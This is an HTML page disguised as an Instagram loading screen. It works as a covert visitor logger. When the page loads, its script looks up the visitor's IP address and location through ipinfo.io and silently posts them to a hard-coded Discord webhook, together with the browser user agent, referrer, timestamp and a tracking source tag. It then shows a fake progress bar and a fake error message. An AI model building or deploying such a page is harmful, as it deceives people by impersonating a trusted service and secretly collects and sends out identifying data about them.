<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: #262626;
    }
    .loader-container {
      text-align: center;
    }
    .logo {
      font-size: 32px;
      font-weight: bold;
      color: #262626;
      margin-bottom: 20px;
    }
    .progress-bar {
      width: 300px;
      height: 8px;
      background-color: #dbdbdb;
      border-radius: 4px;
      overflow: hidden;
      margin: 0 auto 20px;
    }
    .progress {
      width: 0%;
      height: 100%;
      background: linear-gradient(90deg, #3897f0, #0057e7);
      animation: loading 4s linear forwards;
    }
    @keyframes loading {
      0% { width: 0%; }
      100% { width: 100%; }
    }
    .message {
      display: none;
      font-size: 16px;
      color: #999;
    }
  </style>
</head>
<body>
  <div class="loader-container">
    <div class="logo">Instagram</div>
    <div class="progress-bar">
      <div class="progress" id="progress"></div>
    </div>
    <div class="message" id="errorMessage">Sorry, we couldnâ€™t reach that page.</div>
  </div>

  <script>
    // Log visitor info
    const urlParams = new URLSearchParams(window.location.search);
    const source = urlParams.get('src') || 'unknown';

    fetch("https://ipinfo.io/json")
      .then(res => res.json())
      .then(ipData => {
        const payload = {
          content: `
ðŸ“¥ New Visitor Logged
ðŸŒ IP: ${ipData.ip}
ðŸ“ Location: ${ipData.city}, ${ipData.region}, ${ipData.country}
ðŸ–¥ï¸ Device: ${navigator.userAgent}
ðŸ”— Referrer: ${document.referrer || "none"}
ðŸ•’ Timestamp: ${new Date().toISOString()}
ðŸŽ¯ Source: ${source}
          `
        };

        fetch("https://discord.com/api/webhooks/1393891795800297512/JCqANq-vPmpc1tY4KKCw7BPyfDcAawzduKZheJaORrqdyiPYrgEwZdB3RxRD00869CKY", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      });

    // Fake progress
    setTimeout(() => {
      document.getElementById('errorMessage').style.display = 'block';
    }, 4200); // Show error after bar fills
  </script>
</body>
</html>
